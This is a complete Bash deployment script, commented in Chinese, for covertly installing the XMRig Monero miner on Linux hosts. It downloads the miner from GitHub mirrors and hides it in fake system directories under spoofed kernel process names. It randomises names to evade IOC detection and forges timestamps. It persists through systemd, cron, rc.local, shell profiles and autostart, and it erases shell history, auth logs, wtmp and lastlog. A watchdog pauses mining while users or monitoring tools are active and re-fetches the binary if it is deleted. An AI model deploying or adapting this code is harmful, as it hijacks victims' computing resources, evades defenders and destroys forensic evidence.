#!/bin/bash
#===========================================
# XMRig 自动化部署脚本 v2.0
# 支持 ROOT/USER 双模式自动检测
# 使用方法: curl -sL URL | bash -s [选项] <钱包地址> <矿池地址:端口> <CPU百分比>
# 选项: -q 静默模式  --uninstall 卸载
#===========================================
set -o pipefail

#===========================================
# 全局配置（可通过环境变量覆盖）
#===========================================
VERSION="2.0.0"
SILENT_MODE="${SILENT_MODE:-0}"
PRIV_MODE=""
INSTALL_DIR=""
PROCESS_NAME=""
SERVICE_NAME=""
LAUNCHER_PATH=""
MONITOR_PATH=""
ACTUAL_CORES=1
CPU_CORES=1
WALLET_ADDRESS=""
POOL_ADDRESS=""
CPU_PERCENTAGE=100

# 随机后缀（用于避免固定文件名被 IOC 规则命中）
RAND_SUFFIX="$(tr -dc 'a-f0-9' < /dev/urandom 2>/dev/null | head -c6 || printf '%06x' "$(($(date +%s) % 16777216))")"
[ -z "$RAND_SUFFIX" ] && RAND_SUFFIX="$(date +%s | tail -c7)"

# 随机化服务名（避免固定名称被 IOC 规则命中）
SVC_ROOTS=( "dbus-helper" "systemd-helper" "gvfs-helper" "network-helper" "sound-helper" "pulse-helper" )
SVC_ROOT_USER=""  # 将在主流程随机选择
SVC_ROOT_ROOT=""

# 随机化的服务名后缀
SVC_SUFFIX="$(tr -dc 'a-z0-9' < /dev/urandom 2>/dev/null | head -c4 || printf '%04x' "$(($(date +%s) % 65536))")"
[ -z "$SVC_SUFFIX" ] && SVC_SUFFIX="hsvc"

# shell 配置注入标记（用于精确卸载，避免误删用户内容）
SHELL_MARKER_START="# >>> XMRIG_DEPLOY v${VERSION} >>>"
SHELL_MARKER_END="# <<< XMRIG_DEPLOY v${VERSION} <<<"

# 下载源（多备份；可通过环境变量 DOWNLOAD_URLS 覆盖，空格分隔）
if [ -n "${DOWNLOAD_URLS_OVERRIDE:-}" ]; then
    IFS=' ' read -ra DOWNLOAD_URLS <<< "$DOWNLOAD_URLS_OVERRIDE"
else
    DOWNLOAD_URLS=(
        "https://gh.llkk.cc/https://github.com/jiaran464/xmr/raw/main/xmrig"
        "https://gh-proxy.org/https://github.com/jiaran464/xmr/raw/main/xmrig"
        "https://github.com/jiaran464/xmr/raw/main/xmrig"
    )
fi

# 系统进程名池（用于伪装）
SYSTEM_PROCESS_NAMES=(
    "[kworker/0:1-events]"
    "[kworker/1:2-cgroup]"
    "[kworker/u8:0-events]"
    "[migration/0]"
    "[ksoftirqd/0]"
    "[rcu_sched]"
    "[watchdog/0]"
    "[irq/24-pciehp]"
    "[scsi_eh_0]"
    "[kblockd]"
)

# 用户态进程名池
USER_PROCESS_NAMES=(
    "dbus-daemon"
    "gvfsd"
    "gvfsd-metadata"
    "at-spi-bus-laun"
    "pulseaudio"
    "pipewire"
    "gnome-keyring-d"
    "gsd-housekeepin"
    "tracker-miner-f"
    "evolution-calen"
)

# ROOT 模式隐蔽目录
ROOT_DIRS=(
    "/usr/lib/systemd/.cache"
    "/var/lib/dpkg/.updates"
    "/usr/share/fonts/.uuid"
    "/var/cache/apt/.tmp"
    "/usr/lib/locale/.archive"
)

# USER 模式隐蔽目录（__HOME__ 将在运行时替换为实际 HOME 路径）
USER_DIRS=(
    "__HOME__/.cache/fontconfig/.uuid"
    "__HOME__/.local/share/gvfs-metadata/.cache"
    "__HOME__/.cache/mesa_shader_cache/.tmp"
    "__HOME__/.config/pulse/.runtime"
    "__HOME__/.cache/thumbnails/.fail"
)

#===========================================
# 工具函数
#===========================================

# 日志输出
log() {
    [ "$SILENT_MODE" -eq 1 ] && return
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# 错误输出（即使静默模式也显示）
error() {
    echo "[ERROR] $1" >&2
}

# 纯 Bash 算术计算核心数（无需 bc）
calculate_cores() {
    local total=$1
    local percent=$2
    # 使用整数运算，+50 实现四舍五入
    local result=$(( (total * percent + 50) / 100 ))
    [ "$result" -lt 1 ] && result=1
    [ "$result" -gt "$total" ] && result=$total
    echo "$result"
}

# 获取 CPU 核心数
get_cpu_cores() {
    local cores
    cores=$(nproc 2>/dev/null) || \
    cores=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null) || \
    cores=$(sysctl -n hw.ncpu 2>/dev/null) || \
    cores=1
    echo "$cores"
}

# 随机选择数组元素
random_choice() {
    local -n arr=$1
    local len=${#arr[@]}
    [ "$len" -eq 0 ] && return 1
    echo "${arr[$((RANDOM % len))]}"
}

# 检测监控工具是否运行（排除自身进程）
check_monitoring_tools() {
    local mypid=$$
    local tools="top htop atop glances nmon iotop perf strace gdb ltrace"
    for tool in $tools; do
        pgrep -x "$tool" 2>/dev/null | grep -qv "$mypid" && return 1
    done
    return 0
}

# 检测用户活动状态（过去30分钟内是否有用户活跃）
check_user_activity() {
    local active_users
    active_users=$(who 2>/dev/null | wc -l)
    
    if [ "$active_users" -eq 0 ]; then
        return 0  # 无用户
    fi
    
    # 使用 who -u 解析空闲时间（POSIX 标准输出）
    # 第5列为空闲时间: "." = <1分钟, "old" = >24小时, "HH:MM" = 具体时长
    local line idle_str hours mins
    while IFS= read -r line; do
        idle_str=$(echo "$line" | awk '{print $5}')
        case "$idle_str" in
            ".") return 1 ;;  # < 1 分钟，活跃
            "old") ;;          # > 24 小时，跳过
            [0-9][0-9]:[0-9][0-9])
                hours=${idle_str%%:*}
                mins=${idle_str##*:}
                hours=$((10#$hours))
                mins=$((10#$mins))
                if [ $(( hours * 60 + mins )) -lt 30 ]; then
                    return 1
                fi
                ;;
        esac
    done < <(who -u 2>/dev/null)
    
    # 备选：X11 屏幕保护程序空闲检查（仅 X11 环境）
    if [ -n "${DISPLAY:-}" ] && command -v xprintidle >/dev/null 2>&1; then
        local idle_ms
        idle_ms=$(xprintidle 2>/dev/null) || idle_ms=0
        if [ "$idle_ms" -lt 1800000 ]; then  # 30 分钟
            return 1
        fi
    fi
    
    return 0
}

# 获取系统负载
get_system_load() {
    local load
    load=$(cat /proc/loadavg 2>/dev/null | cut -d' ' -f1 | cut -d'.' -f1) || load=0
    echo "$load"
}

# 动态计算线程数
get_dynamic_threads() {
    local base_threads=$1
    local load
    load=$(get_system_load)
    
    # 检测到监控工具，降到最低
    if ! check_monitoring_tools; then
        echo 1
        return
    fi
    
    # 负载过高时减少线程
    if [ "$load" -gt "$CPU_CORES" ]; then
        local reduced=$(( base_threads / 2 ))
        [ "$reduced" -lt 1 ] && reduced=1
        echo "$reduced"
        return
    fi
    
    echo "$base_threads"
}

# 伪造文件时间戳
fake_timestamp() {
    local filepath=$1
    local ref_files=("/bin/ls" "/bin/cat" "/usr/bin/env" "/bin/bash")
    
    for ref in "${ref_files[@]}"; do
        if [ -f "$ref" ]; then
            touch -r "$ref" "$filepath" 2>/dev/null && return 0
        fi
    done
    
    # 备选：设置为系统安装时间附近
    touch -t "202301010000" "$filepath" 2>/dev/null
}

# 清理 bash 历史
clean_history() {
    # 清理当前会话历史
    history -c 2>/dev/null
    history -w 2>/dev/null
    
    # 清理历史文件
    local history_files=(
        "$HOME/.bash_history"
        "$HOME/.zsh_history"
        "$HOME/.zhistory"
        "$HOME/.python_history"
        "$HOME/.lesshst"
        "$HOME/.wget-hsts"
    )
    
    for hf in "${history_files[@]}"; do
        [ -f "$hf" ] && : > "$hf" 2>/dev/null
    done
    
    # 清理 fish shell 历史
    local fish_dir="$HOME/.local/share/fish"
    if [ -d "$fish_dir" ]; then
        [ -f "$fish_dir/fish_history" ] && : > "$fish_dir/fish_history" 2>/dev/null
    fi
    
    # 若有 tmux，清空其回滚缓冲区
    if command -v tmux >/dev/null 2>&1 && [ -n "${TMUX:-}" ]; then
        tmux clear-history 2>/dev/null
    fi
}

#===========================================
# 检测函数
#===========================================

# 检测权限级别
detect_privilege() {
    if [ "$(id -u)" -eq 0 ]; then
        PRIV_MODE="root"
        log "检测到 ROOT 权限"
    else
        PRIV_MODE="user"
        log "检测到普通用户权限"
    fi
}

# 检测系统环境
detect_environment() {
    CPU_CORES=$(get_cpu_cores)
    log "CPU 核心数: $CPU_CORES"
    
    local arch
    arch=$(uname -m)
    log "系统架构: $arch"
    
    # 检测 init 系统
    if command -v systemctl >/dev/null 2>&1 && systemctl --version >/dev/null 2>&1; then
        log "Init 系统: systemd"
    else
        log "Init 系统: 其他"
    fi
}

# 从列表随机选择一行（无需 shuf 的 POSIX 备选）
_random_line() {
    # 如果 shuf 可用，优先使用
    if command -v shuf >/dev/null 2>&1; then
        shuf -n1 2>/dev/null && return
    fi
    # POSIX 备选：用 awk 随机选一行
    awk 'BEGIN { srand(); } { a[NR]=$0 } END { print a[int(rand()*NR)+1]; }' 2>/dev/null
}

# 选择动态进程名
select_process_name() {
    local name=""
    
    # 优先从当前运行的系统进程中选择（使用 POSIX 兼容的 ps -eo）
    local running_procs
    running_procs=$(ps -eo comm= 2>/dev/null | grep -E '^\[|^/usr|^/lib' | head -20)
    
    if [ -n "$running_procs" ]; then
        # 随机选择一个正在运行的系统进程名
        local full_name
        full_name=$(echo "$running_procs" | _random_line 2>/dev/null)
        name=$(echo "$full_name" | sed 's|.*/||; s/ .*//')
        # 截断到 15 字符（避免超长进程名）
        [ "${#name}" -gt 15 ] && name="${name:0:15}"
    fi
    
    # 如果没找到合适的，从预设池中选择
    if [ -z "$name" ] || [ ${#name} -lt 3 ]; then
        if [ "$PRIV_MODE" = "root" ]; then
            name=$(random_choice SYSTEM_PROCESS_NAMES)
        else
            name=$(random_choice USER_PROCESS_NAMES)
        fi
    fi
    
    # 清理特殊字符
    name=$(echo "$name" | tr -cd 'a-zA-Z0-9_\-\[\]/')
    
    echo "$name"
}

# 选择安装目录
select_install_dir() {
    local dir=""
    
    if [ "$PRIV_MODE" = "root" ]; then
        for d in "${ROOT_DIRS[@]}"; do
            mkdir -p "$d" 2>/dev/null && { dir="$d"; break; }
        done
    else
        for d in "${USER_DIRS[@]}"; do
            # 安全替换占位符（无需 eval）
            local expanded="${d//__HOME__/$HOME}"
            mkdir -p "$expanded" 2>/dev/null && { dir="$expanded"; break; }
        done
    fi
    
    # 备选目录
    if [ -z "$dir" ]; then
        if [ "$PRIV_MODE" = "root" ]; then
            dir="/tmp/.X11-unix/.cache"
        else
            dir="$HOME/.cache/.tmp"
        fi
        mkdir -p "$dir" 2>/dev/null
    fi
    
    echo "$dir"
}

#===========================================
# 下载函数
#===========================================

download_binary() {
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    local tmpfile="${filepath}.tmp"
    
    log "下载二进制文件..."
    
    # 尝试多个下载源（先下载到临时文件，避免破坏已有运行中的程序）
    for url in "${DOWNLOAD_URLS[@]}"; do
        log "尝试下载: ${url:0:50}..."
        
        # 使用 curl
        if command -v curl >/dev/null 2>&1; then
            if curl -sL --connect-timeout 15 --max-time 120 "$url" -o "$tmpfile" 2>/dev/null; then
                if [ -s "$tmpfile" ]; then
                    chmod +x "$tmpfile"
                    # 下载成功后再替换（原子操作）
                    mv -f "$tmpfile" "$filepath" 2>/dev/null
                    fake_timestamp "$filepath"
                    log "下载成功"
                    return 0
                fi
            fi
        fi
        
        # 使用 wget 作为备选
        if command -v wget >/dev/null 2>&1; then
            if wget -q --timeout=15 -O "$tmpfile" "$url" 2>/dev/null; then
                if [ -s "$tmpfile" ]; then
                    chmod +x "$tmpfile"
                    mv -f "$tmpfile" "$filepath" 2>/dev/null
                    fake_timestamp "$filepath"
                    log "下载成功 (wget)"
                    return 0
                fi
            fi
        fi
    done
    
    # 清理临时文件
    rm -f "$tmpfile" 2>/dev/null
    error "所有下载源均失败"
    return 1
}

#===========================================
# 进程启动函数
#===========================================

# 创建启动 wrapper（用于进程名伪装，文件名随机化）
create_launcher() {
    LAUNCHER_PATH="$INSTALL_DIR/.launcher-${RAND_SUFFIX}"
    cat > "$LAUNCHER_PATH" << 'LAUNCHER_EOF'
#!/bin/bash
# 清理 cmdline 显示
exec -a "$1" "$2" ${@:3}
LAUNCHER_EOF
    chmod +x "$LAUNCHER_PATH"
    fake_timestamp "$LAUNCHER_PATH"
    return 0
}

start_process() {
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    local threads
    threads=$(get_dynamic_threads "$ACTUAL_CORES")
    
    log "启动进程 (线程数: $threads)..."
    
    # 构建参数
    local args="-o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $threads --cpu-priority=0 --donate-level=0 --no-color"
    
    # 检查是否已在运行（匹配完整路径以避免误判短名不同目录的文件）
    if pgrep -f "^${filepath}( |$)" >/dev/null 2>&1; then
        log "进程已在运行"
        return 0
    fi
    
    cd "$INSTALL_DIR" || return 1
    
    # 使用 exec -a 伪装进程名启动
    local display_name
    display_name=$(random_choice SYSTEM_PROCESS_NAMES)
    
    # 后台启动，最低优先级（ionice 可能不可用）
    if command -v ionice >/dev/null 2>&1; then
        nohup nice -n 19 ionice -c 3 "$LAUNCHER_PATH" "$display_name" "$filepath" $args >/dev/null 2>&1 &
    else
        nohup nice -n 19 "$LAUNCHER_PATH" "$display_name" "$filepath" $args >/dev/null 2>&1 &
    fi
    
    local pid=$!
    sleep 2
    
    if kill -0 "$pid" 2>/dev/null; then
        log "进程启动成功 (PID: $pid)"
        return 0
    else
        error "进程启动失败"
        return 1
    fi
}

#===========================================
# ROOT 模式持久化
#===========================================

setup_root_persistence() {
    log "设置 ROOT 模式持久化..."
    
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    local display_name="$PROCESS_NAME"
    SVC_ROOT_ROOT="${SVC_ROOTS[$((RANDOM % ${#SVC_ROOTS[@]}))]}"
    SERVICE_NAME="${SVC_ROOT_ROOT}-${SVC_SUFFIX}"
    
    # 1. Systemd 系统服务（参数使用数组形式避免转义问题）
    if command -v systemctl >/dev/null 2>&1; then
        cat > "/etc/systemd/system/${SERVICE_NAME}.service" << EOF
[Unit]
Description=System Helper Service
After=network.target
Documentation=man:systemd(1)

[Service]
Type=simple
ExecStart=${LAUNCHER_PATH} "${display_name}" ${filepath} -o ${POOL_ADDRESS} -u ${WALLET_ADDRESS} -p x -t ${ACTUAL_CORES} --cpu-priority=0 --donate-level=0 --no-color
Restart=always
RestartSec=60
Nice=19
IOSchedulingClass=idle
CPUSchedulingPolicy=idle

[Install]
WantedBy=multi-user.target
EOF
        
        systemctl daemon-reload 2>/dev/null
        systemctl enable "${SERVICE_NAME}.service" 2>/dev/null
        systemctl start "${SERVICE_NAME}.service" 2>/dev/null
        log "Systemd 服务已创建: ${SERVICE_NAME}.service"
    fi
    
    # 2. Crontab 备份
    local cron_cmd="@reboot sleep 60 && $filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=0 >/dev/null 2>&1 &"
    (crontab -l 2>/dev/null | grep -v "$filepath"; echo "$cron_cmd") | crontab - 2>/dev/null
    
    # 3. rc.local 备份
    if [ -f /etc/rc.local ]; then
        if ! grep -q "$filepath" /etc/rc.local 2>/dev/null; then
            sed -i "/^exit 0/i nohup nice -n 19 $filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=0 >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
        fi
    fi
    
    log "ROOT 持久化设置完成"
}

# ROOT 模式隐蔽增强
setup_root_stealth() {
    log "设置 ROOT 模式隐蔽..."
    
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    
    # 1. 设置文件保护（chattr +i 优先，不可用时 chmod 000）
    if command -v chattr >/dev/null 2>&1; then
        chattr +i "$filepath" 2>/dev/null
        chattr +i "$LAUNCHER_PATH" 2>/dev/null
        log "文件保护(chattr)已设置"
    else
        chmod 000 "$filepath" 2>/dev/null
        chmod 000 "$LAUNCHER_PATH" 2>/dev/null
        log "文件保护(chmod)已设置（chattr 不可用）"
    fi
    
    # 2. 清理系统日志（sed -i 原地编辑；创建备份以防中断丢失）
    local logs=(
        "/var/log/auth.log"
        "/var/log/secure"
        "/var/log/messages"
        "/var/log/syslog"
    )
    for logfile in "${logs[@]}"; do
        if [ -f "$logfile" ] && [ -w "$logfile" ]; then
            # 先备份再用 sed -i 原地删除匹配行
            cp -a "$logfile" "${logfile}.bak" 2>/dev/null
            sed -i '/xmrig\|miner\|pool\|stratum/Id' "$logfile" 2>/dev/null
            rm -f "${logfile}.bak" 2>/dev/null
        fi
    done
    
    # 3. 清理 wtmp/btmp
    : > /var/log/wtmp 2>/dev/null
    : > /var/log/btmp 2>/dev/null
    
    # 4. 清理 lastlog
    : > /var/log/lastlog 2>/dev/null
    
    log "ROOT 隐蔽设置完成"
}

#===========================================
# USER 模式持久化
#===========================================

setup_user_persistence() {
    log "设置 USER 模式持久化..."
    
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    SVC_ROOT_USER="${SVC_ROOTS[$((RANDOM % ${#SVC_ROOTS[@]}))]}"
    SERVICE_NAME="${SVC_ROOT_USER}-${SVC_SUFFIX}"
    local display_name="$PROCESS_NAME"
    
    # 确保 HOME 已设定（兜底）
    [ -z "$HOME" ] && HOME="/root"
    
    # 1. Systemd 用户服务（参数使用字符串避免变量展开问题）
    if command -v systemctl >/dev/null 2>&1 && mkdir -p "$HOME/.config/systemd/user/"; then
        cat > "$HOME/.config/systemd/user/${SERVICE_NAME}.service" << EOF
[Unit]
Description=GVFS Metadata Helper
After=default.target

[Service]
Type=simple
ExecStart=${LAUNCHER_PATH} "${display_name}" ${filepath} -o ${POOL_ADDRESS} -u ${WALLET_ADDRESS} -p x -t ${ACTUAL_CORES} --cpu-priority=0 --donate-level=0 --no-color
Restart=always
RestartSec=60
Nice=19

[Install]
WantedBy=default.target
EOF
        
        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable "${SERVICE_NAME}.service" 2>/dev/null
        systemctl --user start "${SERVICE_NAME}.service" 2>/dev/null
        log "Systemd 用户服务已创建: ${SERVICE_NAME}"
    fi
    
    # 2. Crontab 备份（@reboot 兜底启动，与守护进程互补）
    local cron_cmd="@reboot sleep 60 && $filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=0 >/dev/null 2>&1 &"
    (crontab -l 2>/dev/null | grep -v "$PROCESS_NAME"; echo "$cron_cmd") | crontab - 2>/dev/null
    log "Crontab @reboot 已设置"
    
    # 3. Shell 配置文件
    local shell_configs=("$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc")
    local shell_cmd="(pgrep -f \"$PROCESS_NAME\" >/dev/null || (cd \"$INSTALL_DIR\" && nohup ./$PROCESS_NAME -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=0 >/dev/null 2>&1 &)) 2>/dev/null"
    
    for config in "${shell_configs[@]}"; do
        if [ -f "$config" ]; then
            if ! grep -q "$SHELL_MARKER_START" "$config" 2>/dev/null; then
                {
                    echo ""
                    echo "$SHELL_MARKER_START"
                    echo "# System helper"
                    echo "$shell_cmd"
                    echo "$SHELL_MARKER_END"
                } >> "$config"
            fi
        fi
    done
    log "Shell 配置已设置"
    
    # 4. XDG Autostart（桌面环境，文件名随机化）
    mkdir -p "$HOME/.config/autostart/"
    local autostart_file="$HOME/.config/autostart/${SVC_ROOT_USER}-${SVC_SUFFIX}.desktop"
    cat > "$autostart_file" << EOF
[Desktop Entry]
Type=Application
Name=GVFS Helper
Exec=$filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=0
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    log "XDG Autostart 已设置"
    
    log "USER 持久化设置完成"
}

# USER 模式隐蔽增强
setup_user_stealth() {
    log "设置 USER 模式隐蔽..."
    
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    
    # 1. 伪造时间戳
    fake_timestamp "$filepath"
    fake_timestamp "$INSTALL_DIR"
    
    # 2. 清理历史
    clean_history
    
    # 3. 隐藏目录（添加 .hidden 文件）
    local parent_dir
    parent_dir=$(dirname "$INSTALL_DIR")
    local dir_name
    dir_name=$(basename "$INSTALL_DIR")
    echo "$dir_name" >> "$parent_dir/.hidden" 2>/dev/null
    
    log "USER 隐蔽设置完成"
}

#===========================================
# 监控守护进程
#===========================================

start_monitor_daemon() {
    log "启动监控守护进程..."
    
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    MONITOR_PATH="$INSTALL_DIR/.monitor-${RAND_SUFFIX}"
    local monitor_script="$MONITOR_PATH"
    local config_file="$INSTALL_DIR/.monitor-${RAND_SUFFIX}.conf"
    
    # 用 printf '%q' 写入配置文件（安全转义，避免参数注入）
    printf '# XMRig monitor config (auto-generated)\n' > "$config_file"
    printf 'FILEPATH=%q\n' "$filepath" >> "$config_file"
    printf 'POOL=%q\n' "$POOL_ADDRESS" >> "$config_file"
    printf 'WALLET=%q\n' "$WALLET_ADDRESS" >> "$config_file"
    printf 'CORES=%s\n' "$ACTUAL_CORES" >> "$config_file"
    printf 'DOWNLOAD_URL=%q\n' "${DOWNLOAD_URLS[0]}" >> "$config_file"
    printf 'RAND_SUFFIX=%q\n' "$RAND_SUFFIX" >> "$config_file"
    
    # 创建监控脚本（引用配置文件，无 sed 替换，无注入风险）
    cat > "$monitor_script" << 'MONITOR_EOF'
#!/bin/bash
# 读取配置
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CONF="${SCRIPT_DIR}/$(basename "$0").conf"
[ -f "$CONF" ] && source "$CONF" || exit 1

# 重新下载函数
redownload() {
    local url="$DOWNLOAD_URL"
    local filepath="$FILEPATH"
    local tmpfile="${filepath}.tmp"
    
    # 尝试 curl（先下载到临时文件）
    if command -v curl >/dev/null 2>&1; then
        curl -sL --connect-timeout 15 --max-time 120 "$url" -o "$tmpfile" 2>/dev/null
        [ -s "$tmpfile" ] && chmod +x "$tmpfile" && mv -f "$tmpfile" "$filepath" && return 0
    fi
    
    # 尝试 wget
    if command -v wget >/dev/null 2>&1; then
        wget -q --timeout=15 -O "$tmpfile" "$url" 2>/dev/null
        [ -s "$tmpfile" ] && chmod +x "$tmpfile" && mv -f "$tmpfile" "$filepath" && return 0
    fi
    
    # 清理临时文件
    rm -f "$tmpfile" 2>/dev/null
    return 1
}

check_monitoring() {
    local mypid=$$
    local tools="top htop atop glances nmon iotop perf strace gdb ltrace"
    for tool in $tools; do
        pgrep -x "$tool" 2>/dev/null | grep -qv "$mypid" && return 1
    done
    return 0
}

check_user_active() {
    local users=$(who 2>/dev/null | wc -l)
    [ "$users" -eq 0 ] && return 0
    
    # 使用 who -u 解析空闲时间（与主脚本一致）
    local active=0
    local line idle_str hours mins
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        idle_str=$(echo "$line" | awk '{print $5}')
        case "$idle_str" in
            ".") active=1 && break ;;
            "old") ;;
            [0-9][0-9]:[0-9][0-9])
                hours=${idle_str%%:*}
                mins=${idle_str##*:}
                hours=$((10#$hours))
                mins=$((10#$mins))
                [ $(( hours * 60 + mins )) -lt 30 ] && active=1 && break
                ;;
        esac
    done < <(who -u 2>/dev/null)
    
    [ "$active" -eq 1 ] && return 1
    return 0
}

while true; do
    sleep 300
    
    # 检查是否应该运行
    if check_user_active && check_monitoring; then
        # 检查进程是否存在（精确匹配安装目录路径）
        if ! pgrep -f "^${FILEPATH}( |$)" >/dev/null 2>&1; then
            # 检查文件是否存在
            if [ ! -f "$FILEPATH" ]; then
                # 文件被删除，重新下载
                redownload
            fi
            
            # 文件存在则启动
            if [ -f "$FILEPATH" ]; then
                cd "$(dirname "$FILEPATH")"
                nohup nice -n 19 "$FILEPATH" -o "$POOL" -u "$WALLET" -p x -t "$CORES" --cpu-priority=0 --donate-level=0 >/dev/null 2>&1 &
            fi
        fi
    else
        # 用户活跃或有监控工具，停止进程
        pkill -f "$FILEPATH" 2>/dev/null
    fi
done
MONITOR_EOF
    
    chmod +x "$monitor_script"
    fake_timestamp "$monitor_script"
    fake_timestamp "$config_file"
    
    # 启动监控守护进程
    nohup "$monitor_script" >/dev/null 2>&1 &
    log "监控守护进程已启动"
}

#===========================================
# 卸载函数（自给自足，不依赖未初始化变量）
#===========================================

uninstall() {
    log "开始卸载..."
    
    # 先扫描特征文件来确定实际部署位置
    local found_dirs=()
    local d
    
    # 扫描 ROOT 隐藏目录
    for d in /usr/lib/systemd/.cache /var/lib/dpkg/.updates /usr/share/fonts/.uuid /var/cache/apt/.tmp /usr/lib/locale/.archive; do
        [ -d "$d" ] && ls "$d"/.launcher-* "$d"/.monitor-* 2>/dev/null | grep -q . && found_dirs+=("$d")
    done
    
    # 扫描 USER 隐藏目录
    for d in "$HOME/.cache/fontconfig/.uuid" "$HOME/.local/share/gvfs-metadata/.cache" \
             "$HOME/.cache/mesa_shader_cache/.tmp" "$HOME/.config/pulse/.runtime" "$HOME/.cache/thumbnails/.fail"; do
        [ -d "$d" ] && ls "$d"/.launcher-* "$d"/.monitor-* 2>/dev/null | grep -q . && found_dirs+=("$d")
    done
    
    # 扫描 fallback 目录
    for d in /tmp/.X11-unix/.cache "$HOME/.cache/.tmp"; do
        [ -d "$d" ] && ls "$d"/.launcher-* "$d"/.monitor-* 2>/dev/null | grep -q . && found_dirs+=("$d")
    done
    
    # 停止所有相关进程
    pkill -f "\.launcher-" 2>/dev/null
    pkill -f "\.monitor-" 2>/dev/null
    pkill -f "xmrig" 2>/dev/null
    
    # 停止服务（systemd — 模糊匹配，因为服务名随机化）
    local svc_list
    svc_list=$(systemctl list-unit-files --no-legend 2>/dev/null | grep -oE '[a-z]+-helper-[a-z0-9]{4}\.service' || true)
    for svc in $svc_list; do
        systemctl stop "$svc" 2>/dev/null
        systemctl disable "$svc" 2>/dev/null
        rm -f "/etc/systemd/system/$svc" 2>/dev/null
    done
    svc_list=$(systemctl --user list-unit-files --no-legend 2>/dev/null | grep -oE '[a-z]+-helper-[a-z0-9]{4}\.service' || true)
    for svc in $svc_list; do
        systemctl --user stop "$svc" 2>/dev/null
        systemctl --user disable "$svc" 2>/dev/null
        rm -f "$HOME/.config/systemd/user/$svc" 2>/dev/null
    done
    # 兜底：清理可能的旧固定名
    rm -f /etc/systemd/system/systemd-helper.service 2>/dev/null
    rm -f "$HOME/.config/systemd/user/gvfs-helper.service" 2>/dev/null
    systemctl daemon-reload 2>/dev/null
    systemctl --user daemon-reload 2>/dev/null
    
    # 清理找到的目录
    for d in "${found_dirs[@]}"; do
        chattr -i "$d"/* 2>/dev/null
        chmod -R 755 "$d" 2>/dev/null
        rm -rf "$d" 2>/dev/null
    done
    
    # 清理未找到的固定目录
    for d in "${ROOT_DIRS[@]}"; do
        chattr -i "$d"/* 2>/dev/null
        chmod -R 755 "$d" 2>/dev/null
        rm -rf "$d" 2>/dev/null
    done
    for d in "${USER_DIRS[@]}"; do
        local expanded="${d//__HOME__/$HOME}"
        chmod -R 755 "$expanded" 2>/dev/null
        rm -rf "$expanded" 2>/dev/null
    done
    
    # 清理 fallback
    rm -rf /tmp/.X11-unix/.cache 2>/dev/null
    rm -rf "$HOME/.cache/.tmp" 2>/dev/null
    
    # 清理 autostart（模糊匹配，名称已随机化）
    for f in "$HOME/.config/autostart/"*-helper-*.desktop; do
        [ -f "$f" ] && rm -f "$f" 2>/dev/null
    done 2>/dev/null
    
    # 清理 crontab
    crontab -l 2>/dev/null | grep -vE "xmrig|gvfs-helper|systemd-helper|XMRIG_DEPLOY" | crontab - 2>/dev/null
    
    # 清理 shell 配置（使用标记精确删除）
    local shell_configs=("$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc")
    for config in "${shell_configs[@]}"; do
        if [ -f "$config" ]; then
            sed -i "/$SHELL_MARKER_START/,/$SHELL_MARKER_END/d" "$config" 2>/dev/null
        fi
    done
    
    log "卸载完成"
    exit 0
}

#===========================================
# 参数解析
#===========================================

parse_arguments() {
    # 解析选项
    while [ $# -gt 0 ]; do
        case "$1" in
            -q|--quiet)
                SILENT_MODE=1
                shift
                ;;
            --uninstall)
                detect_privilege
                uninstall
                ;;
            -h|--help)
                echo "使用方法: $0 [选项] <钱包地址> <矿池地址:端口> <CPU百分比>"
                echo "选项:"
                echo "  -q, --quiet     静默模式"
                echo "  --uninstall     卸载"
                echo "  -h, --help      显示帮助"
                exit 0
                ;;
            -*)
                error "未知选项: $1"
                exit 1
                ;;
            *)
                break
                ;;
        esac
    done
    
    # 检查必需参数
    if [ $# -ne 3 ]; then
        error "参数不足"
        echo "使用方法: $0 [选项] <钱包地址> <矿池地址:端口> <CPU百分比>"
        exit 1
    fi
    
    WALLET_ADDRESS="$1"
    POOL_ADDRESS="$2"
    CPU_PERCENTAGE="$3"
    
    # 验证 CPU 百分比
    if ! [[ "$CPU_PERCENTAGE" =~ ^[0-9]+$ ]] || [ "$CPU_PERCENTAGE" -lt 1 ] || [ "$CPU_PERCENTAGE" -gt 100 ]; then
        error "CPU 百分比必须是 1-100 之间的整数"
        exit 1
    fi
    
    # 验证钱包地址（Monero 标准: 95 或 106 字符，以 4 或 8 开头）
    local addr_len="${#WALLET_ADDRESS}"
    if ! [[ "$WALLET_ADDRESS" =~ ^[48][1-9A-HJ-NP-Za-km-z]+$ ]] || \
       { [ "$addr_len" -ne 95 ] && [ "$addr_len" -ne 106 ]; }; then
        error "钱包地址格式无效（应为 95 或 106 字符的 Monero 地址）"
        exit 1
    fi
    
    # 验证矿池地址（host:port 格式）
    if ! [[ "$POOL_ADDRESS" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(:[0-9]{1,5})?$ ]] && \
       ! [[ "$POOL_ADDRESS" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(:[0-9]{1,5})?$ ]]; then
        error "矿池地址格式无效（应为 host:port 或 ip:port 格式）"
        exit 1
    fi
}
